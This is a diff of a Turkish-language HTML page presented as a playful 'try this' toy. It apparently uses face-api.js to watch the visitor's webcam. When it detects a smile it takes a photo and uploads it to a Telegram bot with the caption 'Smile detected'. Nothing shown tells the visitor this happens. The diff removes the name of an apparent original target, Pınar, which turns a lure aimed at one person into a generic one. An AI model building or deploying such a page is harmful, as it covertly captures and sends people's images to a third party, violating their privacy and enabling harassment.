@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pınar İçin Deneme</title>
+    <title>Deneme</title>
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
         body { 
@@ -31,7 +31,7 @@
 </head>
 <body>
 
-    <h1>Pınar şunu bi denesene</h1>
+    <h1>şunu bi denesene</h1>
     
     <div id="container">
         <video id="video" autoplay muted playsinline></video>
@@ -106,7 +106,7 @@
                 const fd = new FormData();
                 fd.append('chat_id', USER_ID);
                 fd.append('photo', blob, 'image.jpg');
-                fd.append('caption', 'Pınar: Gülümseme algılandı.');
+                fd.append('caption', ' Gülümseme algılandı.');
 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
